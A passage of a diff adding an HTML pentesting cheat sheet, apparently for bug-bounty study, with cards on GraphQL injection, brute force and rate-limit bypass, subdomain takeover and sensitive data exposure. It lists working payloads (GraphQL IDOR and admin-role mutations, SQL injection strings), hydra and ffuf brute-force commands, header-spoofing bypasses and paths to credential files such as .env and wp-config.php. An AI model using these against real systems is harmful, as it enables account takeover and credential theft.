+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/logic-flaws" target="_blank">PortSwigger Business Logic Labs</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V27: GRAPHQL ==================== -->
+<div class="vuln-card" id="v27">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">27</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">GRAPHQL INJECTION</div>
+      <div class="vuln-short">Exploiting GraphQL APIs via introspection, injection, and authorization flaws.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Discovery</div>
+<div class="code-block">// Common GraphQL endpoints:
+/graphql
+/api/graphql
+/graphiql
+/v1/graphql
+/query</div>
+    <div class="section-label">Introspection (Enumerate Schema)</div>
+<div class="code-block orange">// Full introspection query:
+{"query": "__schema { queryType { name } types { name fields { name type { name } } } }"}
+
+// Simple type listing:
+{"query": "{__schema{types{name}}}"}
+
+// Get all queries:
+{"query": "{__schema{queryType{fields{name description}}}}"}
+
+// Bypass disabled introspection:
+{"query": "{__schema\n{queryType{name}}}"}  // newline bypass
+{"query": "{ __type(name: \"Query\") { fields { name } } }"}  // __type still works</div>
+    <div class="section-label">Exploitation Payloads</div>
+<div class="code-block red">// IDOR via GraphQL
+{"query": "{ user(id: 2) { email password } }"}
+{"query": "{ order(id: 12345) { total address } }"}
+
+// Batch query abuse (DoS / auth bypass)
+[{"query":"{user{id email}}"},{"query":"{user{id email}}"},...] // repeat 100x
+
+// Mutation abuse
+{"query": "mutation { updateUser(id:2, role:\"admin\") { id role } }"}
+
+// SQL/NoSQL injection inside GraphQL args
+{"query": "{ user(name: \"' OR 1=1--\") { email } }"}
+
+// Field suggestion abuse - typo reveals real fields
+{"query": "{ usr { email } }"}  // response suggests "user"
+
+// Alias batching to bypass rate limit
+{"query": "{ a:login(user:\"admin\",pass:\"1\") b:login(user:\"admin\",pass:\"2\") }"}</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">GraphQL Voyager</span><span class="tool-badge">InQL (Burp)</span><span class="tool-badge">Altair</span><span class="tool-badge">clairvoyance</span></div>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/graphql" target="_blank">PortSwigger GraphQL Labs</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection" target="_blank">PayloadsAllTheThings - GraphQL</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V28: RATE LIMITING ==================== -->
+<div class="vuln-card" id="v28">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">28</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">RATE LIMITING / BRUTE FORCE</div>
+      <div class="vuln-short">Absence of rate limiting enables brute-force of credentials, OTPs, and API keys.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>Login endpoint</li><li>OTP / 2FA codes</li><li>Password reset tokens</li><li>API keys</li><li>Captcha bypass</li></ul>
+    <div class="section-label">Techniques</div>
+<div class="code-block orange">// 1. Basic brute force - no lockout
+POST /login → 1000 requests with password list
+
+// 2. Rate limit bypass via headers
+X-Forwarded-For: 1.1.1.1  → rotate IP each request
+X-Real-IP: 2.2.2.2
+X-Originating-IP: 3.3.3.3
+CF-Connecting-IP: 4.4.4.4
+
+// 3. Rate limit bypass via null byte in username
+username=admin%00
+
+// 4. OTP brute force (4-6 digit = 10,000-1,000,000 combinations)
+// Send rapid requests with codes 0000-9999
+
+// 5. Password spray (avoid lockout)
+// Try 1 password against all users → rotate
+
+// 6. Padding attack on OTP
+// Change: {"otp":"1234"} to {"otp":["1234","1234",...]}
+
+// 7. Race condition on OTP
+// Submit correct OTP in parallel → bypass single-use limit
+
+// 8. Username enumeration via timing</div>
+    <div class="section-label">Common Wordlists</div>
+<div class="code-block green">// Passwords:
+rockyou.txt, SecLists/Passwords/Common-Credentials/
+10-million-password-list-top-100.txt
+
+// Usernames:
+SecLists/Usernames/Names/names.txt</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Hydra</span><span class="tool-badge">Burp Intruder</span><span class="tool-badge">ffuf</span><span class="tool-badge">Medusa</span><span class="tool-badge">Turbo Intruder</span></div>
+<div class="code-block green">hydra -L users.txt -P pass.txt http-post-form "//login:user=^USER^&pass=^PASS^:Invalid"
+ffuf -w passwords.txt -X POST -d "user=admin&pass=FUZZ" -u https://target.com/login -fc 401</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Account takeover via credential brute-force</li><li>OTP/2FA bypass</li><li>API key enumeration</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://owasp.org/www-community/attacks/Brute_force_attack" target="_blank">OWASP Brute Force Attack</a></li>
+      <li><a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists - Wordlists</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V29: SUBDOMAIN TAKEOVER ==================== -->
+<div class="vuln-card" id="v29">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">29</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">SUBDOMAIN TAKEOVER</div>
+      <div class="vuln-short">Claiming dangling DNS records pointing to unclaimed third-party services.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">How It Works</div>
+    <div class="field-row"><strong>Mechanism</strong>
+1. target.com has: sub.target.com CNAME service.github.io<br>
+2. GitHub Pages project deleted / unclaimed<br>
+3. Attacker creates GitHub Pages project at service.github.io<br>
+4. sub.target.com now serves attacker content</div>
+    <div class="section-label">Detection</div>
+<div class="code-block orange">// Step 1: Enumerate subdomains
+subfinder -d target.com -o subs.txt
+amass enum -d target.com -o subs.txt
+assetfinder target.com
+
+// Step 2: Check for dangling CNAME
+for sub in $(cat subs.txt); do
+  dig $sub CNAME +short
+done
+
+// Step 3: Check if CNAME target is claimable
+// Error indicators per service:
+// GitHub Pages: "There isn't a GitHub Pages site here"
+// Heroku: "No such app"
+// Fastly: "Fastly error: unknown domain"
+// Shopify: "Sorry, this shop is currently unavailable"
+// AWS S3: "NoSuchBucket"
+// Zendesk: "Help Center Closed"</div>
+    <div class="section-label">Vulnerable Service Fingerprints</div>
+<div class="code-block red">GitHub Pages:       "There isn't a GitHub Pages site here"
+Heroku:             "No such app"
+AWS S3:             "NoSuchBucket"
+Fastly:             "Fastly error: unknown domain"
+Azure:              "404 Web Site not found"
+Shopify:            "Sorry, this shop is currently unavailable"
+Pantheon:           "404 error unknown site"
+Surge.sh:           "project not found"
+Tumblr:             "Whatever you were looking for doesn't currently exist"</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">subjack</span><span class="tool-badge">nuclei</span><span class="tool-badge">takeover</span><span class="tool-badge">subfinder</span><span class="tool-badge">subzy</span></div>
+<div class="code-block green">subjack -w subs.txt -t 100 -timeout 30 -ssl -c ~/fingerprints.json
+subzy run --targets subs.txt</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Cookie theft (same-origin on subdomain)</li><li>Phishing via trusted subdomain</li><li>XSS via subdomain</li><li>Malware hosting</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://github.com/EdOverflow/can-i-take-over-xyz" target="_blank">can-i-take-over-xyz - Service List</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Takeovers" target="_blank">PayloadsAllTheThings - Takeovers</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V30: SENSITIVE DATA EXPOSURE ==================== -->
+<div class="vuln-card" id="v30">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">30</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">SENSITIVE DATA EXPOSURE</div>
+      <div class="vuln-short">Unintentional exposure of credentials, keys, PII through misconfiguration or verbose responses.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Look</div>
+<div class="code-block orange">// Source Code / JS Files
+// Search for keywords in JS bundles:
+api_key, apikey, secret, password, token, auth,
+AWS_ACCESS, PRIVATE_KEY, bearer, passwd, credential
+
+// Common files to check:
+/.env
+/.git/config
+/config.php
+/database.yml
+/settings.py
+/application.properties
+/wp-config.php
+/web.config
+/appsettings.json
+/config/database.yml
+/package.json  (may expose internal module names)
+
+// Error messages
+// Verbose stack traces with DB connection strings
+// Internal server paths in error messages
+
+// API Responses
+// Returning sensitive fields: SSN, card numbers, passwords (hashed or plain)
+// Extra fields in JSON not shown in UI
+
+// Backup / old files
+/index.php.bak
+/config.php~
+/admin.php.old
+/backup.sql
+
+// Comment in HTML source
+<!-- DB: mysql://root:password@localhost/app -->
+<!-- TODO: remove test API key: sk-prod-abc123 -->
+
+// Google Dorks
+site:target.com filetype:sql
+site:target.com filetype:log
+site:target.com "DB_PASSWORD"
+site:pastebin.com target.com</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">truffleHog</span><span class="tool-badge">gitrob</span><span class="tool-badge">gitleaks</span><span class="tool-badge">gospider</span><span class="tool-badge">LinkFinder</span></div>
+<div class="code-block green">trufflehog git https://github.com/target/repo
+gitleaks detect --source . --report-path=report.json
+linkfinder.py -i https://target.com -d  # Extract JS endpoints/secrets</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Credential/API key theft</li><li>Database access</li><li>PII exposure (GDPR violation)</li><li>Full account/system compromise</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" target="_blank">OWASP A02: Cryptographic Failures</a></li>
+      <li><a href="https://github.com/trufflesecurity/trufflehog" target="_blank">TruffleHog - Secret Scanner</a></li>
+    </ul>
+  </div>
+</div>
+
+  </div><!-- /content -->
+</div><!-- /main -->
+
+<button id="scroll-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+// Toggle individual card
+function toggleCard(header) {
+  const body = header.nextElementSibling;
+  const chevron = header.querySelector('.chevron');
+  if (body.classList.contains('collapsed')) {
+    body.classList.remove('collapsed');
+    header.classList.remove('collapsed-header');
+  } else {
+    body.classList.add('collapsed');
+    header.classList.add('collapsed-header');
+  }
+}
+
+// Expand/collapse all
+function expandAll() {
+  document.querySelectorAll('.vuln-body').forEach(b => b.classList.remove('collapsed'));
+  document.querySelectorAll('.vuln-header').forEach(h => h.classList.remove('collapsed-header'));
+}
+function collapseAll() {
+  document.querySelectorAll('.vuln-body').forEach(b => b.classList.add('collapsed'));
+  document.querySelectorAll('.vuln-header').forEach(h => h.classList.add('collapsed-header'));
+}
+
+// Search
+function searchVulns(query) {
+  const q = query.toLowerCase().trim();
+  const cards = document.querySelectorAll('.vuln-card');
+  cards.forEach(card => {
+    const text = card.innerText.toLowerCase();
+    card.style.display = (!q || text.includes(q)) ? '' : 'none';
+  });
+  // Highlight in nav
+  document.querySelectorAll('.nav-item').forEach(item => {
+    const text = item.innerText.toLowerCase();
+    item.style.opacity = (!q || text.includes(q)) ? '1' : '0.3';
+  });
+}
+
+// Scroll to top button
+window.addEventListener('scroll', () => {
+  const btn = document.getElementById('scroll-top');
+  btn.classList.toggle('show', window.scrollY > 300);
+});
+
+// Active nav highlighting
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const id = entry.target.id;
+      document.querySelectorAll('.nav-item').forEach(item => {
+        item.classList.toggle('active', item.getAttribute('href') === '#'+id);
+      });
+    }
+  });
+}, { rootMargin: '-20% 0px -60% 0px' });
+
+document.querySelectorAll('.vuln-card[id]').forEach(card => observer.observe(card));
+</script>
+</body>
+</html>
